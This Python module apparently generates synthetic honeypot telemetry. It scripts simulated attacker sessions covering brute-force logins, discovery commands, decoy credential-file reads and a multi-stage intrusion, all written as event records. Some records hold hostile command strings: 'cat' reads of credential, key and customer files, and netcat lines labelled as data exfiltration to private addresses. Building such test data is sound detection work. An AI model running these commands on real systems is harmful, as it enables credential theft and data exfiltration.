"""Controlled simulated attacker.

Generates reproducible behavioural event sequences that target ONLY the local,
isolated honeypot environment. It never contacts external systems.

Each scenario is a scripted sequence of RawEvent objects with explicit timing.
"""

import random
import string
from datetime import datetime, timedelta
from typing import Iterator, List

from app.schemas.event import RawEvent
from app.telemetry.action_catalog import classify_command_action, is_sensitive_target

USERS = ["root", "admin", "ubuntu", "oracle", "test", "guest", "www-data"]
PASSWORDS = ["password", "123456", "admin", "root", "toor", "letmein", "P@ssw0rd"]


def _rstring(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


SCENARIOS = {
    "auth_attempts": {
        "label": "Credential brute-force attempts",
        "desc": "Multiple successive authentication failures followed by one success.",
    },
    "discovery": {
        "label": "System discovery",
        "desc": "Environment discovery commands such as directory/system enumeration.",
    },
    "resource_enumeration": {
        "label": "Resource enumeration",
        "desc": "Probing multiple directories and files to map resources.",
    },
    "decoy_access": {
        "label": "Sensitive decoy access",
        "desc": "Reading decoy files that contain synthetic secrets.",
    },
    "multi_stage": {
        "label": "Multi-stage attack",
        "desc": "A controlled multi-stage interaction: auth -> discovery -> access -> collection.",
    },
    "benign": {
        "label": "Benign session",
        "desc": "Normal user-like interaction with minimal commands.",
    },
}


class SimulatedAttacker:
    def __init__(self, seed: int = 42):
        self.rng = random.Random(seed)
        self.seed = seed

    def _base_session(self, start: datetime, service: str = "ssh") -> str:
        return f"SIM-{self.seed}-{self.rng.randint(100000, 999999)}-{service}"

    def _ev(self, ts, session, event_type, action, service="ssh", **extra):
        common = dict(
            timestamp=ts,
            session_id=session,
            source=f"10.0.0.{self.rng.randint(2, 240)}",
            destination="127.0.0.1",
            service=service,
            result="success",
        )
        common.update(extra)
        return RawEvent(event_type=event_type, action=action, **common)

    def _auth_sequence(self, session, start, n_failed=3, service="ssh", success=True):
        evs = []
        t = start
        evs.append(self._ev(t, session, "connection", "connect", service))
        t += timedelta(milliseconds=self.rng.randint(200, 800))
        for i in range(n_failed):
            evs.append(
                self._ev(
                    t,
                    session,
                    "authentication_failure",
                    "authentication",
                    service,
                    username=self.rng.choice(USERS),
                    result="failure",
                )
            )
            t += timedelta(seconds=1)
        if success:
            evs.append(
                self._ev(
                    t,
                    session,
                    "authentication_success",
                    "authentication",
                    service,
                    username="root",
                    result="success",
                )
            )
            t += timedelta(seconds=1)
        e = evs[-1]
        # close session
        close = self._ev(t + timedelta(seconds=30), session, "session_end", "close", service)
        evs.append(close)
        return evs

    def _discovery(self, session, start, service="ssh"):
        evs = []
        t = start
        for cmd, action in [
            ("uname -a", "system_discovery"),
            ("id", "system_discovery"),
            ("ls -la /", "directory_listing"),
            ("whoami", "system_discovery"),
            ("find / -name '*.conf'", "file_search"),
        ]:
            evs.append(self._ev(t, session, "command", action, service, command=cmd))
            t += timedelta(seconds=self.rng.randint(1, 4))
        evs.append(self._ev(t, session, "session_end", "close", service))
        return evs

    def _resource_enum(self, session, start, service="ssh"):
        evs = []
        t = start
        for path, action in [
            ("/var/www", "directory_listing"),
            ("/etc", "directory_listing"),
            ("/opt/db", "resource_access"),
            ("/home/admin/.ssh", "directory_listing"),
        ]:
            cmd = f"ls -la {path}" if action == "directory_listing" else f"cd {path}"
            evs.append(self._ev(t, session, "command", action, service, command=cmd, target=path))
            t += timedelta(seconds=self.rng.randint(1, 3))
        evs.append(self._ev(t, session, "session_end", "close", service))
        return evs

    def _decoy_access(self, session, start, service="ssh"):
        evs = []
        t = start
        for cmd, action, target in [
            ("cat /opt/prod/db_credentials.conf", "file_read", "db_credentials.conf"),
            ("cat /etc/config/settings.ini", "file_read", "settings.ini"),
            ("cat /home/admin/backup/keys.pem", "file_read", "keys.pem"),
            ("cat /var/db/customer_records.csv", "file_read", "customer_records.csv"),
        ]:
            evs.append(self._ev(t, session, "command", action, service, command=cmd, target=target))
            t += timedelta(seconds=self.rng.randint(1, 3))
        evs.append(self._ev(t, session, "command", "network_exfil", service, command="nc 10.0.0.9 4444"))
        evs.append(self._ev(t + timedelta(seconds=2), session, "session_end", "close", service))
        return evs

    def _multi_stage(self, session, start, service="ssh"):
        evs = [
            self._ev(start, session, "connection", "connect", service),
        ]
        t = start + timedelta(milliseconds=300)
        # auth
        for i in range(2):
            evs.append(self._ev(t, session, "authentication_failure", "authentication", service, username=self.rng.choice(["root", "admin"]), result="failure"))
            t += timedelta(seconds=1)
        evs.append(self._ev(t, session, "authentication_success", "authentication", service, username="root", result="success"))
        t += timedelta(seconds=1)
        # discovery
        for cmd, action in [
            ("uname -a", "system_discovery"),
            ("ls -la /", "directory_listing"),
            ("find / -name '*.db'", "file_search"),
        ]:
            evs.append(self._ev(t, session, "command", action, service, command=cmd))
            t += timedelta(seconds=self.rng.randint(1, 3))
        # resource enumeration
        for path, action in [
            ("/opt/db", "resource_access"),
            ("/etc", "directory_listing"),
        ]:
            cnt = f"ls -la {path}"
            evs.append(self._ev(t, session, "command", action, service, command=cnt, target=path))
            t += timedelta(seconds=self.rng.randint(1, 3))
        # sensitive access
        for cmd, action, target in [
            ("cat /opt/prod/db_credentials.conf", "file_read", "db_credentials.conf"),
            ("cat /var/db/customer_records.csv", "file_read", "customer_records.csv"),
        ]:
            evs.append(self._ev(t, session, "command", action, service, command=cmd, target=target))
            t += timedelta(seconds=self.rng.randint(1, 3))
        # collection
        evs.append(self._ev(t, session, "command", "network_exfil", service, command="nc 10.0.0.55 8080"))
        evs.append(self._ev(t + timedelta(seconds=3), session, "session_end", "close", service))
        return evs

    def _benign(self, session, start, service="ssh"):
        evs = []
        t = start
        evs.append(self._ev(t, session, "connection", "connect", service))
        t += timedelta(milliseconds=300)
        evs.append(self._ev(t, session, "authentication_success", "authentication", service, username="ubuntu", result="success"))
        t += timedelta(seconds=1)
        for cmd, action in [
            ("pwd", "system_discovery"),
            ("ls", "directory_listing"),
            ("cd /home/ubuntu", "directory_change"),
            ("cat README.txt", "file_read"),
            ("exit", "session_exit"),
        ]:
            evs.append(self._ev(t, session, "command", action, service, command=cmd))
            t += timedelta(seconds=self.rng.randint(2, 8))
        evs.append(self._ev(t + timedelta(seconds=2), session, "session_end", "close", service))
        return evs

    def generate(self, scenario: str, n_sessions: int = 3, start: datetime = None) -> List[RawEvent]:
        start = start or datetime.utcnow()
        if scenario not in SCENARIOS:
            raise ValueError(f"Unknown scenario: {scenario}")
        all_evs: List[RawEvent] = []
        for i in range(n_sessions):
            session = self._base_session(start + timedelta(seconds=i * 5))
            if scenario == "auth_attempts":
                evs = self._auth_sequence(session, start + timedelta(seconds=i * 60))
            elif scenario == "discovery":
                evs = self._discovery(session, start + timedelta(seconds=i * 60))
            elif scenario == "resource_enumeration":
                evs = self._resource_enum(session, start + timedelta(seconds=i * 60))
            elif scenario == "decoy_access":
                evs = self._decoy_access(session, start + timedelta(seconds=i * 60))
            elif scenario == "multi_stage":
                evs = self._multi_stage(session, start + timedelta(seconds=i * 60))
            else:
                evs = self._benign(session, start + timedelta(seconds=i * 60))
            all_evs.extend(evs)
        return sorted(all_evs, key=lambda e: e.timestamp)
